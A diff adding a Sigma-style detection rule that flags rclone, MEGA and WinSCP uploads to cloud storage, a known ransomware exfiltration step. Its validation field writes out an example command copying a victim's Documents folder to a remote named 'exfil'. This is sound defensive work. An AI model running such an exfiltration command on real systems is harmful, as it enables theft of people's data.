@@ -1,0 +1,43 @@
+title: Bulk Upload to Cloud Storage via Command-Line Tooling
+id: 59fa2b08-7c19-4d48-2830-tyrian000067
+status: experimental
+description: >
+  Detects rclone, megacmd and similar utilities being driven from the command line
+  to copy data to cloud storage. Ransomware crews reach for rclone specifically
+  because it is a legitimate, signed, cross-platform binary whose traffic is TLS to
+  a mainstream provider, which defeats both signature matching and egress rules
+  written around "unknown destinations". Pair with the archive-staging rule: stage
+  then upload is the whole double-extortion pattern.
+references:
+  - https://attack.mitre.org/techniques/T1567/002/
+author: Tyrian
+date: 2026/08/03
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  rclone_like:
+    Image|endswith:
+      - '\rclone.exe'
+      - '\megacmd.exe'
+      - '\MEGAclient.exe'
+      - '\winscp.com'
+      - '\winscp.exe'
+    CommandLine|contains:
+      - 'copy'
+      - 'sync'
+      - 'move'
+      - 'put'
+  renamed_rclone:
+    OriginalFileName: 'rclone.exe'
+  condition: rclone_like or renamed_rclone
+validation:
+  atomic: T1567.002
+  fire: |-
+    rclone copy C:\Users\victim\Documents remote:exfil --transfers 8
+falsepositives:
+  - Backup workflows that genuinely use rclone or WinSCP, which should be inventoried
+level: high
+tags:
+  - attack.exfiltration
+  - attack.t1567.002
